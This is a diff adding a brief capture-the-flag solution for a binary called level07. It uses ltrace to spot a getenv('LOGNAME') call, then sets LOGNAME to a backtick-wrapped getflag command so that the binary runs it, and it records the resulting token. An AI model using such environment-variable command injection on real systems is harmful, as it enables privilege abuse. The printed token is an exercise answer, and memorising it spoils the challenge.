@@ -1,0 +1,7 @@
+# We can see we have a binary, let's ltrace it
+	ltrace ./level07
+# We can see a getenv() call that take LOGNAME environment variable
+# Let's use this variable to call getflag
+	export LOGNAME=\`getflag\`
+# Let's then run the binary
+# Token is : fiumuikeil55xe9cu4dood66h
